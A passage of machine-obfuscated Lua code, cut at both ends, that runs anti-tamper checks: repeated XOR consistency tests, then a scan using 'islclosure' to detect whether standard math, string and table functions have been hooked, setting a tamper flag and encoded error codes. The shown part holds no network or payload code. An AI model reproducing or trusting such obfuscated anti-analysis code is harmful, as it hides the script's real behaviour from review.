 do local _r;if bit32 then _r=bit32.bxor(_0cMC18qdv0Gx,_0taArOKTLmV4) elseif bit then _r=bit.bxor(_0cMC18qdv0Gx,_0taArOKTLmV4) else local a,b,r,s=_0cMC18qdv0Gx,_0taArOKTLmV4,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0PeySwyE8u0f then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,49,51) end end
 local _0cW4sHeWcSVT,_0tGv4mozvZNk,_0hJSBUCBfoOt=24873,22777,14800
 do local _r;if bit32 then _r=bit32.bxor(_0tGv4mozvZNk,_0hJSBUCBfoOt) elseif bit then _r=bit.bxor(_0tGv4mozvZNk,_0hJSBUCBfoOt) else local a,b,r,s=_0tGv4mozvZNk,_0hJSBUCBfoOt,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0cW4sHeWcSVT then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,49,52) end end
 local _0XNPU4PwVl99,_0hzFkepjjiOD,_0fp4NpFsYA7u=15275,16466,31737
 do local _r;if bit32 then _r=bit32.bxor(_0hzFkepjjiOD,_0fp4NpFsYA7u) elseif bit then _r=bit.bxor(_0hzFkepjjiOD,_0fp4NpFsYA7u) else local a,b,r,s=_0hzFkepjjiOD,_0fp4NpFsYA7u,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0XNPU4PwVl99 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,49,53) end end
 local _0PxVWOZLXNqe,_0smBW1r_WUi0,_0wBvBDfZiXky=22394,27042,16088
 do local _r;if bit32 then _r=bit32.bxor(_0smBW1r_WUi0,_0wBvBDfZiXky) elseif bit then _r=bit.bxor(_0smBW1r_WUi0,_0wBvBDfZiXky) else local a,b,r,s=_0smBW1r_WUi0,_0wBvBDfZiXky,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0PxVWOZLXNqe then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,49,54) end end
 local _0aE7oj5Ytw2d,_0JUxmRq_cGG7,_0ZqR1NJFYQp3=4857,24900,29629
 do local _r;if bit32 then _r=bit32.bxor(_0JUxmRq_cGG7,_0ZqR1NJFYQp3) elseif bit then _r=bit.bxor(_0JUxmRq_cGG7,_0ZqR1NJFYQp3) else local a,b,r,s=_0JUxmRq_cGG7,_0ZqR1NJFYQp3,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0aE7oj5Ytw2d then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,49,55) end end
 local _0Tvqh9QHu62o,_0nb_3HeapBSI,_0JPtnYVKqaiZ=31055,53986,43949
 do local _r;if bit32 then _r=bit32.bxor(_0nb_3HeapBSI,_0JPtnYVKqaiZ) elseif bit then _r=bit.bxor(_0nb_3HeapBSI,_0JPtnYVKqaiZ) else local a,b,r,s=_0nb_3HeapBSI,_0JPtnYVKqaiZ,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0Tvqh9QHu62o then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,49,56) end end
 local _0tFHQVwpABhL,_0z4Tq0HxnLWK,_0zJF4bpL_vaO=10863,23575,30328
 do local _r;if bit32 then _r=bit32.bxor(_0z4Tq0HxnLWK,_0zJF4bpL_vaO) elseif bit then _r=bit.bxor(_0z4Tq0HxnLWK,_0zJF4bpL_vaO) else local a,b,r,s=_0z4Tq0HxnLWK,_0zJF4bpL_vaO,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0tFHQVwpABhL then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,49,57) end end
 local _0TsVLD5SCYP1,_0gjl5HxNeJ2T,_0XexFlUm_Vet=18410,51957,36127
 do local _r;if bit32 then _r=bit32.bxor(_0gjl5HxNeJ2T,_0XexFlUm_Vet) elseif bit then _r=bit.bxor(_0gjl5HxNeJ2T,_0XexFlUm_Vet) else local a,b,r,s=_0gjl5HxNeJ2T,_0XexFlUm_Vet,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0TsVLD5SCYP1 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,50,48) end end
 local _0DrkxNXGAbHl,_0eyJp0lZkuXF,_0x_ejxrExPqi=39653,3310,38411
 do local _r;if bit32 then _r=bit32.bxor(_0eyJp0lZkuXF,_0x_ejxrExPqi) elseif bit then _r=bit.bxor(_0eyJp0lZkuXF,_0x_ejxrExPqi) else local a,b,r,s=_0eyJp0lZkuXF,_0x_ejxrExPqi,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0DrkxNXGAbHl then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,50,49) end end
 local _0vmGB3Nboqz3,_0hK8XZzhG9yc,_0iPEOIiyIZJd=14956,27811,22223
 do local _r;if bit32 then _r=bit32.bxor(_0hK8XZzhG9yc,_0iPEOIiyIZJd) elseif bit then _r=bit.bxor(_0hK8XZzhG9yc,_0iPEOIiyIZJd) else local a,b,r,s=_0hK8XZzhG9yc,_0iPEOIiyIZJd,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0vmGB3Nboqz3 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,50,50) end end
 local _0lofEX_ECAbI,_0CHJcJ5iJV1o,_0cI6Q1HTTAgz=9867,21388,29959
 do local _r;if bit32 then _r=bit32.bxor(_0CHJcJ5iJV1o,_0cI6Q1HTTAgz) elseif bit then _r=bit.bxor(_0CHJcJ5iJV1o,_0cI6Q1HTTAgz) else local a,b,r,s=_0CHJcJ5iJV1o,_0cI6Q1HTTAgz,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0lofEX_ECAbI then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,50,51) end end
 local _0zc2q6gAGiDN,_0lFO7mkY7ZYi,_0OPX97vj6Xob=881,11776,11633
 do local _r;if bit32 then _r=bit32.bxor(_0lFO7mkY7ZYi,_0OPX97vj6Xob) elseif bit then _r=bit.bxor(_0lFO7mkY7ZYi,_0OPX97vj6Xob) else local a,b,r,s=_0lFO7mkY7ZYi,_0OPX97vj6Xob,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0zc2q6gAGiDN then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,50,52) end end
 local _0gMS7mQCPjp0,_0XXsMG7sZ_Vd,_0kdmcFS0GLHD=14596,41192,39404
 do local _r;if bit32 then _r=bit32.bxor(_0XXsMG7sZ_Vd,_0kdmcFS0GLHD) elseif bit then _r=bit.bxor(_0XXsMG7sZ_Vd,_0kdmcFS0GLHD) else local a,b,r,s=_0XXsMG7sZ_Vd,_0kdmcFS0GLHD,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0gMS7mQCPjp0 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,50,53) end end
 local _0CZHiJiRq9vm,_0WXIw40awV_F,_0j0bsIhZblWN=29704,26768,7320
 do local _r;if bit32 then _r=bit32.bxor(_0WXIw40awV_F,_0j0bsIhZblWN) elseif bit then _r=bit.bxor(_0WXIw40awV_F,_0j0bsIhZblWN) else local a,b,r,s=_0WXIw40awV_F,_0j0bsIhZblWN,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0CZHiJiRq9vm then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,50,54) end end
 local _0WNzt0KLkbN6,_0rnRggjNjuA4,_0nDMnWxGU3uM=22372,5512,17132
 do local _r;if bit32 then _r=bit32.bxor(_0rnRggjNjuA4,_0nDMnWxGU3uM) elseif bit then _r=bit.bxor(_0rnRggjNjuA4,_0nDMnWxGU3uM) else local a,b,r,s=_0rnRggjNjuA4,_0nDMnWxGU3uM,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0WNzt0KLkbN6 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,50,55) end end
 local _0AzWC5QSO2bv,_0pFOBzpxgWSr,_0PcTs9h8AVyk=13280,10818,6562
 do local _r;if bit32 then _r=bit32.bxor(_0pFOBzpxgWSr,_0PcTs9h8AVyk) elseif bit then _r=bit.bxor(_0pFOBzpxgWSr,_0PcTs9h8AVyk) else local a,b,r,s=_0pFOBzpxgWSr,_0PcTs9h8AVyk,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0AzWC5QSO2bv then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,50,56) end end
 local _0yzNNnLD2yW4,_0OYOvHW6jZz9,_0E6XXPT1H3mi=22306,19648,7138
 do local _r;if bit32 then _r=bit32.bxor(_0OYOvHW6jZz9,_0E6XXPT1H3mi) elseif bit then _r=bit.bxor(_0OYOvHW6jZz9,_0E6XXPT1H3mi) else local a,b,r,s=_0OYOvHW6jZz9,_0E6XXPT1H3mi,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0yzNNnLD2yW4 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,50,57) end end
 local _0j1UKftAPCin,_0zcTofvpdyBE,_0vuugzw1HUiI=5261,30901,27704
 do local _r;if bit32 then _r=bit32.bxor(_0zcTofvpdyBE,_0vuugzw1HUiI) elseif bit then _r=bit.bxor(_0zcTofvpdyBE,_0vuugzw1HUiI) else local a,b,r,s=_0zcTofvpdyBE,_0vuugzw1HUiI,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0j1UKftAPCin then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,51,48) end end
 local _0B8JK9vFxneL,_0DMZlbHeiJr2,_0ruplP1cRgW9=7215,36374,37433
 do local _r;if bit32 then _r=bit32.bxor(_0DMZlbHeiJr2,_0ruplP1cRgW9) elseif bit then _r=bit.bxor(_0DMZlbHeiJr2,_0ruplP1cRgW9) else local a,b,r,s=_0DMZlbHeiJr2,_0ruplP1cRgW9,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0B8JK9vFxneL then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,51,49) end end
 local _0uw4gpTVxvA_,_0bq0pjDgL6xo,_0eaxvGJH8tKW=21085,29959,10074
 do local _r;if bit32 then _r=bit32.bxor(_0bq0pjDgL6xo,_0eaxvGJH8tKW) elseif bit then _r=bit.bxor(_0bq0pjDgL6xo,_0eaxvGJH8tKW) else local a,b,r,s=_0bq0pjDgL6xo,_0eaxvGJH8tKW,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0uw4gpTVxvA_ then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,51,50) end end
 local _0SIcGlG52pO4,_0BJjChvC0dvR,_0ZPpxLFlKQTN=46631,37927,8704
 do local _r;if bit32 then _r=bit32.bxor(_0BJjChvC0dvR,_0ZPpxLFlKQTN) elseif bit then _r=bit.bxor(_0BJjChvC0dvR,_0ZPpxLFlKQTN) else local a,b,r,s=_0BJjChvC0dvR,_0ZPpxLFlKQTN,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0SIcGlG52pO4 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,51,51) end end
 local _0GN0dGI7LCIx,_0P_XdsCEQzgu,_0p9HGspXABLD=31797,13220,20369
 do local _r;if bit32 then _r=bit32.bxor(_0P_XdsCEQzgu,_0p9HGspXABLD) elseif bit then _r=bit.bxor(_0P_XdsCEQzgu,_0p9HGspXABLD) else local a,b,r,s=_0P_XdsCEQzgu,_0p9HGspXABLD,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0GN0dGI7LCIx then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,51,52) end end
 local _0jkGMmZlYcs2,_0MyF8BeAZc20,_0JvABvfxVmoO=30125,56630,43163
 do local _r;if bit32 then _r=bit32.bxor(_0MyF8BeAZc20,_0JvABvfxVmoO) elseif bit then _r=bit.bxor(_0MyF8BeAZc20,_0JvABvfxVmoO) else local a,b,r,s=_0MyF8BeAZc20,_0JvABvfxVmoO,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0jkGMmZlYcs2 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,51,53) end end
 local _0e34JhZG8TJU,_0rvOlvrWRL_h,_0j50nKDYLn3B=30355,58492,37615
 do local _r;if bit32 then _r=bit32.bxor(_0rvOlvrWRL_h,_0j50nKDYLn3B) elseif bit then _r=bit.bxor(_0rvOlvrWRL_h,_0j50nKDYLn3B) else local a,b,r,s=_0rvOlvrWRL_h,_0j50nKDYLn3B,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0e34JhZG8TJU then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,51,54) end end
 local _0hDwcMYNn01j,_0qhZKBMT5_Zd,_0NcwLv8AZPIf=42967,9655,33376
 do local _r;if bit32 then _r=bit32.bxor(_0qhZKBMT5_Zd,_0NcwLv8AZPIf) elseif bit then _r=bit.bxor(_0qhZKBMT5_Zd,_0NcwLv8AZPIf) else local a,b,r,s=_0qhZKBMT5_Zd,_0NcwLv8AZPIf,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0hDwcMYNn01j then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,51,55) end end
 local _0QW0pIJcRDn5,_0u0DUPUFrL6G,_0Ly6qmpDSsT_=60959,10502,50969
 do local _r;if bit32 then _r=bit32.bxor(_0u0DUPUFrL6G,_0Ly6qmpDSsT_) elseif bit then _r=bit.bxor(_0u0DUPUFrL6G,_0Ly6qmpDSsT_) else local a,b,r,s=_0u0DUPUFrL6G,_0Ly6qmpDSsT_,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0QW0pIJcRDn5 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,51,56) end end
 local _0SsdOcggpK5O,_0GcQEgDNefX9,_0QbjnBkM8xGQ=29550,24116,11610
 do local _r;if bit32 then _r=bit32.bxor(_0GcQEgDNefX9,_0QbjnBkM8xGQ) elseif bit then _r=bit.bxor(_0GcQEgDNefX9,_0QbjnBkM8xGQ) else local a,b,r,s=_0GcQEgDNefX9,_0QbjnBkM8xGQ,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0SsdOcggpK5O then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,51,57) end end
 local _0sHSemSft5_l,_0sjyARXfO920,_0Wn_t_oquFsO=49231,5313,54414
 do local _r;if bit32 then _r=bit32.bxor(_0sjyARXfO920,_0Wn_t_oquFsO) elseif bit then _r=bit.bxor(_0sjyARXfO920,_0Wn_t_oquFsO) else local a,b,r,s=_0sjyARXfO920,_0Wn_t_oquFsO,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0sHSemSft5_l then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,52,48) end end
 local _0Og6UYpKcyJb,_0w5regzfcwD9,_0mByMR_XXKKY=38089,34635,4994
 do local _r;if bit32 then _r=bit32.bxor(_0w5regzfcwD9,_0mByMR_XXKKY) elseif bit then _r=bit.bxor(_0w5regzfcwD9,_0mByMR_XXKKY) else local a,b,r,s=_0w5regzfcwD9,_0mByMR_XXKKY,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0Og6UYpKcyJb then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,52,49) end end
 local _0Ko3NgyyWgAy,_0A5uDQyOtCVk,_0nTOoGEQMBYk=10308,3403,9487
 do local _r;if bit32 then _r=bit32.bxor(_0A5uDQyOtCVk,_0nTOoGEQMBYk) elseif bit then _r=bit.bxor(_0A5uDQyOtCVk,_0nTOoGEQMBYk) else local a,b,r,s=_0A5uDQyOtCVk,_0nTOoGEQMBYk,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0Ko3NgyyWgAy then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,52,50) end end
 local _0Qm4PGM4_clk,_0Hz2qkHPpNQE,_0muJsioDIxiS=1545,48293,47788
 do local _r;if bit32 then _r=bit32.bxor(_0Hz2qkHPpNQE,_0muJsioDIxiS) elseif bit then _r=bit.bxor(_0Hz2qkHPpNQE,_0muJsioDIxiS) else local a,b,r,s=_0Hz2qkHPpNQE,_0muJsioDIxiS,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0Qm4PGM4_clk then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,52,51) end end
 local _0ns43LvKbA1v,_0Q2dSpxycPjA,_0tfU2Bz9Pwv7=42804,25593,50381
 do local _r;if bit32 then _r=bit32.bxor(_0Q2dSpxycPjA,_0tfU2Bz9Pwv7) elseif bit then _r=bit.bxor(_0Q2dSpxycPjA,_0tfU2Bz9Pwv7) else local a,b,r,s=_0Q2dSpxycPjA,_0tfU2Bz9Pwv7,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0ns43LvKbA1v then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,52,52) end end
 local _0bGo789kkfyX,_0pbEHIJWyN7J,_0lcnG0X_H7Bc=31905,30500,2949
 do local _r;if bit32 then _r=bit32.bxor(_0pbEHIJWyN7J,_0lcnG0X_H7Bc) elseif bit then _r=bit.bxor(_0pbEHIJWyN7J,_0lcnG0X_H7Bc) else local a,b,r,s=_0pbEHIJWyN7J,_0lcnG0X_H7Bc,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0bGo789kkfyX then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,52,53) end end
 local _0uP7Jg5rganM,_0gaCE6MRJ1qc,_0PjZGRuFQMqF=22765,59767,45466
 do local _r;if bit32 then _r=bit32.bxor(_0gaCE6MRJ1qc,_0PjZGRuFQMqF) elseif bit then _r=bit.bxor(_0gaCE6MRJ1qc,_0PjZGRuFQMqF) else local a,b,r,s=_0gaCE6MRJ1qc,_0PjZGRuFQMqF,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0uP7Jg5rganM then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,52,54) end end
 local _0f0dguTA7E1o,_0Gq0eJHQQQcm,_0J8oOXSFYVoM=54167,40706,19605
 do local _r;if bit32 then _r=bit32.bxor(_0Gq0eJHQQQcm,_0J8oOXSFYVoM) elseif bit then _r=bit.bxor(_0Gq0eJHQQQcm,_0J8oOXSFYVoM) else local a,b,r,s=_0Gq0eJHQQQcm,_0J8oOXSFYVoM,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0f0dguTA7E1o then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,52,55) end end
 local _0LFS482vZ3b7,_0QgreJJrJBMz,_0IIjSbWaNUQb=64925,46621,19328
 do local _r;if bit32 then _r=bit32.bxor(_0QgreJJrJBMz,_0IIjSbWaNUQb) elseif bit then _r=bit.bxor(_0QgreJJrJBMz,_0IIjSbWaNUQb) else local a,b,r,s=_0QgreJJrJBMz,_0IIjSbWaNUQb,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0LFS482vZ3b7 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,52,56) end end
 local _0yd9hcELHNHd,_0jMoOp8gu4LW,_0WcPmPWonw8Z=18380,50964,32984
 do local _r;if bit32 then _r=bit32.bxor(_0jMoOp8gu4LW,_0WcPmPWonw8Z) elseif bit then _r=bit.bxor(_0jMoOp8gu4LW,_0WcPmPWonw8Z) else local a,b,r,s=_0jMoOp8gu4LW,_0WcPmPWonw8Z,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0yd9hcELHNHd then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,52,57) end end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _isl4=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(105,115,108,99,108,111,115,117,114,101))
 if type(_isl4)~="function" then return end
 local _0abz4ShS603I=rawget(math or {},string.char(97,98,115))
 if type(_0abz4ShS603I)=="function" and _isl4(_0abz4ShS603I) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(109,97,116,104,95,97,98,115,95,104) end
 local _0HJ9k_Ik1KuL=rawget(math or {},string.char(102,108,111,111,114))
 if type(_0HJ9k_Ik1KuL)=="function" and _isl4(_0HJ9k_Ik1KuL) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(109,97,116,104,95,102,108,111,111,114,95,104) end
 local _0EYufdtFaW_C=rawget(math or {},string.char(99,101,105,108))
 if type(_0EYufdtFaW_C)=="function" and _isl4(_0EYufdtFaW_C) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(109,97,116,104,95,99,101,105,108,95,104) end
 local _0cihuntWUmsf=rawget(math or {},string.char(115,113,114,116))
 if type(_0cihuntWUmsf)=="function" and _isl4(_0cihuntWUmsf) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(109,97,116,104,95,115,113,114,116,95,104) end
 local _0tPbDQTmjksi=rawget(math or {},string.char(115,105,110))
 if type(_0tPbDQTmjksi)=="function" and _isl4(_0tPbDQTmjksi) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(109,97,116,104,95,115,105,110,95,104) end
 local _0s_x9mhd06_q=rawget(math or {},string.char(99,111,115))
 if type(_0s_x9mhd06_q)=="function" and _isl4(_0s_x9mhd06_q) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(109,97,116,104,95,99,111,115,95,104) end
 local _0UOM0Qjnmnvl=rawget(math or {},string.char(114,97,110,100,111,109))
 if type(_0UOM0Qjnmnvl)=="function" and _isl4(_0UOM0Qjnmnvl) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(109,97,116,104,95,114,97,110,100,111,109,95,104) end
 local _0SzFRlgsyVIX=rawget(math or {},string.char(109,97,120))
 if type(_0SzFRlgsyVIX)=="function" and _isl4(_0SzFRlgsyVIX) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(109,97,116,104,95,109,97,120,95,104) end
 local _0VgP31sxXPwR=rawget(math or {},string.char(109,105,110))
 if type(_0VgP31sxXPwR)=="function" and _isl4(_0VgP31sxXPwR) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(109,97,116,104,95,109,105,110,95,104) end
 local _0VIfd8K7v0Jm=rawget(string or {},string.char(108,101,110))
 if type(_0VIfd8K7v0Jm)=="function" and _isl4(_0VIfd8K7v0Jm) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,114,105,110,103,95,108,101,110,95,104) end
 local _0CqsrWwI22xI=rawget(string or {},string.char(115,117,98))
 if type(_0CqsrWwI22xI)=="function" and _isl4(_0CqsrWwI22xI) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,114,105,110,103,95,115,117,98,95,104) end
 local _0pDZCJ3o2Gf1=rawget(string or {},string.char(114,101,112))
 if type(_0pDZCJ3o2Gf1)=="function" and _isl4(_0pDZCJ3o2Gf1) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,114,105,110,103,95,114,101,112,95,104) end
 local _0co1JK5jJo_I=rawget(string or {},string.char(114,101,118,101,114,115,101))
 if type(_0co1JK5jJo_I)=="function" and _isl4(_0co1JK5jJo_I) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,114,105,110,103,95,114,101,118,101,114,115,101,95,104) end
 local _0cV1cjVTyMOT=rawget(string or {},string.char(117,112,112,101,114))
 if type(_0cV1cjVTyMOT)=="function" and _isl4(_0cV1cjVTyMOT) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,114,105,110,103,95,117,112,112,101,114,95,104) end
 local _0GNCl7UYFEnb=rawget(string or {},string.char(108,111,119,101,114))
 if type(_0GNCl7UYFEnb)=="function" and _isl4(_0GNCl7UYFEnb) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,114,105,110,103,95,108,111,119,101,114,95,104) end
 local _0gGvnqRpd2ym=rawget(string or {},string.char(102,105,110,100))
 if type(_0gGvnqRpd2ym)=="function" and _isl4(_0gGvnqRpd2ym) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,114,105,110,103,95,102,105,110,100,95,104) end
 local _0zxJbXTAoMLt=rawget(string or {},string.char(109,97,116,99,104))
 if type(_0zxJbXTAoMLt)=="function" and _isl4(_0zxJbXTAoMLt) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,114,105,110,103,95,109,97,116,99,104,95,104) end
 local _0CBFIX078ycy=rawget(string or {},string.char(103,115,117,98))
 if type(_0CBFIX078ycy)=="function" and _isl4(_0CBFIX078ycy) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,114,105,110,103,95,103,115,117,98,95,104) end
 local _0cmVMLYJ2Md4=rawget(string or {},string.char(103,109,97,116,99,104))
 if type(_0cmVMLYJ2Md4)=="function" and _isl4(_0cmVMLYJ2Md4) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,114,105,110,103,95,103,109,97,116,99,104,95,104) end
 local _0KWVoA1H1b62=rawget(string or {},string.char(102,111,114,109,97,116))
 if type(_0KWVoA1H1b62)=="function" and _isl4(_0KWVoA1H1b62) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,114,105,110,103,95,102,111,114,109,97,116,95,104) end
 local _0Aop4c1uuiB1=rawget(table or {},string.char(105,110,115,101,114,116))
 if type(_0Aop4c1uuiB1)=="function" and _isl4(_0Aop4c1uuiB1) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(116,97,98,108,101,95,105,110,115,101,114,116,95,104) end
 local _0ZAUxJa0twKD=rawget(table or {},string.char(114,101,109,111,118,101))
 if type(_0ZAUxJa0twKD)=="function" and _isl4(_0ZAUxJa0twKD) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(116,97,98,108,101,95,114,101,109,111,118,101,95,104) end
 local _0T7OP6hBYgbR=rawget(table or {},string.char(115,111,114,116))
